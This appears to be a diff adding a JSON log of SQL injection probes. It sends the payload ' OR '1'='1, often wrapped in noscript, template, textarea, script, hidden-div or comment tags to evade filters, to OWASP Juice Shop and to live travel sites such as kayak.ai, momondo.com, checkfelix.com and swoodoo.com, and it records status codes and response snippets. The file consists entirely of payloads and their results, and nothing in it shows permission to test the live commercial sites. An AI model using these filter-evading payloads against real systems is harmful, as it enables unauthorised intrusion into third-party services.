@@ -1,0 +1,233 @@
+[
+  {
+    "url": "https://juice-shop.herokuapp.com?q=' OR '1'='1",
+    "status": 503,
+    "payload": "' OR '1'='1",
+    "type": "SQLi",
+    "snippet": "<!DOCTYPE html>\n<html>\n  <head>\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <meta charset=\"utf-8\">\n    <title>Application Error</title>\n    <style media=\"screen\">\n    "
+  },
+  {
+    "url": "https://juice-shop.herokuapp.com?q=<noscript><template>' OR '1'='1</template></noscript>",
+    "status": 200,
+    "payload": "<noscript><template>' OR '1'='1</template></noscript>",
+    "type": "SQLi",
+    "snippet": "<!--\n  ~ Copyright (c) 2014-2025 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta c"
+  },
+  {
+    "url": "https://juice-shop.herokuapp.com?q=<script data-info='init'><template>' OR '1'='1</template></script>",
+    "status": 200,
+    "payload": "<script data-info='init'><template>' OR '1'='1</template></script>",
+    "type": "SQLi",
+    "snippet": "<!--\n  ~ Copyright (c) 2014-2025 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta c"
+  },
+  {
+    "url": "https://juice-shop.herokuapp.com?q=<noscript>' OR '1'='1</noscript>",
+    "status": 200,
+    "payload": "<noscript>' OR '1'='1</noscript>",
+    "type": "SQLi",
+    "snippet": "<!--\n  ~ Copyright (c) 2014-2025 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta c"
+  },
+  {
+    "url": "https://juice-shop.herokuapp.com?q=<textarea>' OR '1'='1</textarea>",
+    "status": 200,
+    "payload": "<textarea>' OR '1'='1</textarea>",
+    "type": "SQLi",
+    "snippet": "<!--\n  ~ Copyright (c) 2014-2025 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta c"
+  },
+  {
+    "url": "https://juice-shop.herokuapp.com?q=<form action='/submit'><input name='note' value='' OR '1'='1'></form>",
+    "status": 200,
+    "payload": "<form action='/submit'><input name='note' value='' OR '1'='1'></form>",
+    "type": "SQLi",
+    "snippet": "<!--\n  ~ Copyright (c) 2014-2025 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta c"
+  },
+  {
+    "url": "https://juice-shop.herokuapp.com?q=<template>' OR '1'='1</template>",
+    "status": 200,
+    "payload": "<template>' OR '1'='1</template>",
+    "type": "SQLi",
+    "snippet": "<!--\n  ~ Copyright (c) 2014-2025 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta c"
+  },
+  {
+    "url": "https://kayak.ai?q=' OR '1'='1",
+    "status": 406,
+    "payload": "' OR '1'='1",
+    "type": "SQLi",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q={\"action\": \"sync\", \"data\": {\"token\": \"' OR '1'='1\"}}",
+    "status": 406,
+    "payload": "{\"action\": \"sync\", \"data\": {\"token\": \"' OR '1'='1\"}}",
+    "type": "SQLi",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<textarea><template>' OR '1'='1</template></textarea>",
+    "status": 406,
+    "payload": "<textarea><template>' OR '1'='1</template></textarea>",
+    "type": "SQLi",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<textarea>' OR '1'='1</textarea>",
+    "status": 406,
+    "payload": "<textarea>' OR '1'='1</textarea>",
+    "type": "SQLi",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<div style='display:none'>setTimeout(()=>' OR '1'='1,1000)</div>",
+    "status": 200,
+    "payload": "<div style='display:none'>setTimeout(()=>' OR '1'='1,1000)</div>",
+    "type": "SQLi",
+    "snippet": "<!DOCTYPE html>\n<html lang='ro-ro' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 05:31:42 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://kayak.ai?q=setTimeout(()=>' OR '1'='1,1000)",
+    "status": 406,
+    "payload": "setTimeout(()=>' OR '1'='1,1000)",
+    "type": "SQLi",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<form action='/submit'><input name='note' value='<template>' OR '1'='1</template>'></form>",
+    "status": 200,
+    "payload": "<form action='/submit'><input name='note' value='<template>' OR '1'='1</template>'></form>",
+    "type": "SQLi",
+    "snippet": "<!DOCTYPE html>\n<html lang='ro-ro' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 05:33:05 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://kayak.ai?q=' OR '1'='1",
+    "status": 406,
+    "payload": "' OR '1'='1",
+    "type": "SQLi",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<textarea>' OR '1'='1</textarea>",
+    "status": 406,
+    "payload": "<textarea>' OR '1'='1</textarea>",
+    "type": "SQLi",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<!--URGENT:' OR '1'='1-->",
+    "status": 406,
+    "payload": "<!--URGENT:' OR '1'='1-->",
+    "type": "SQLi",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.momondo.com?q=<script data-info='init'><!--' OR '1'='1--></script>",
+    "status": 406,
+    "payload": "<script data-info='init'><!--' OR '1'='1--></script>",
+    "type": "SQLi",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.momondo.com?q=' OR '1'='1",
+    "status": 406,
+    "payload": "' OR '1'='1",
+    "type": "SQLi",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.momondo.com?q=<form action='/submit'><input name='note' value='' OR '1'='1'></form>",
+    "status": 200,
+    "payload": "<form action='/submit'><input name='note' value='' OR '1'='1'></form>",
+    "type": "SQLi",
+    "snippet": "<!DOCTYPE html>\n<html lang='en-us' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 06:22:39 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.momondo.com?q=<body onload=' OR '1'='1>",
+    "status": 406,
+    "payload": "<body onload=' OR '1'='1>",
+    "type": "SQLi",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.momondo.com?q=<noscript><!--' OR '1'='1--></noscript>",
+    "status": 406,
+    "payload": "<noscript><!--' OR '1'='1--></noscript>",
+    "type": "SQLi",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.momondo.com?q=<!--' OR '1'='1-->",
+    "status": 406,
+    "payload": "<!--' OR '1'='1-->",
+    "type": "SQLi",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.checkfelix.com?q=<script data-info='init'>' OR '1'='1</script>",
+    "status": 406,
+    "payload": "<script data-info='init'>' OR '1'='1</script>",
+    "type": "SQLi",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.checkfelix.com?q=' OR '1'='1",
+    "status": 406,
+    "payload": "' OR '1'='1",
+    "type": "SQLi",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.checkfelix.com?q=<div style='display:none'><!--' OR '1'='1--></div>",
+    "status": 200,
+    "payload": "<div style='display:none'><!--' OR '1'='1--></div>",
+    "type": "SQLi",
+    "snippet": "<!DOCTYPE html>\n<html lang='de-at' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 07:03:45 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.checkfelix.com?q=<noscript>' OR '1'='1</noscript>",
+    "status": 406,
+    "payload": "<noscript>' OR '1'='1</noscript>",
+    "type": "SQLi",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.checkfelix.com?q=<!--URGENT:<!--' OR '1'='1-->-->",
+    "status": 406,
+    "payload": "<!--URGENT:<!--' OR '1'='1-->-->",
+    "type": "SQLi",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.checkfelix.com?q=<!--' OR '1'='1-->",
+    "status": 406,
+    "payload": "<!--' OR '1'='1-->",
+    "type": "SQLi",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.swoodoo.com?q=<script data-info='init'>' OR '1'='1</script>",
+    "status": 406,
+    "payload": "<script data-info='init'>' OR '1'='1</script>",
+    "type": "SQLi",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.swoodoo.com?q=' OR '1'='1",
+    "status": 406,
+    "payload": "' OR '1'='1",
+    "type": "SQLi",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.swoodoo.com?q=<!--URGENT:' OR '1'='1-->",
+    "status": 406,
+    "payload": "<!--URGENT:' OR '1'='1-->",
+    "type": "SQLi",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.swoodoo.com?q=<noscript>' OR '1'='1</noscript>",
+    "status": 406,
+    "payload": "<noscript>' OR '1'='1</noscript>",
+    "type": "SQLi",
+    "snippet": ""
+  }
+]
